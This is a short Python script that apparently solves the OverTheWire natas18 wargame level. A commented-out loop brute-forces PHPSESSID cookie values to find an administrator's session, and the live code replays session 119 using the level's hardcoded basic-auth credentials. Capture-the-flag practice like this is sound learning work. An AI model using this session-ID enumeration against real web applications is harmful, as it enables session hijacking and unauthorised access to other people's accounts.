import requests
import time
from requests.auth import HTTPBasicAuth

# chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
# filtered = "bcfgnopstwABDGNPRUXZ02346"
# passwd = ""
# for i in range(118,125):
#     print(f"Testing: {i}", end='\r')
#     cookies = {'PHPSESSID': str(i)}
#     req = requests.post('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth('natas18', 'fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op'), cookies=cookies)
#     if 'You are an admin' in req.text:
#         print(cookies)
#         print(req.text)

cookies = {'PHPSESSID': '119'}
req = requests.post('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth('natas18', 'fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op'), cookies=cookies)
print(req.text)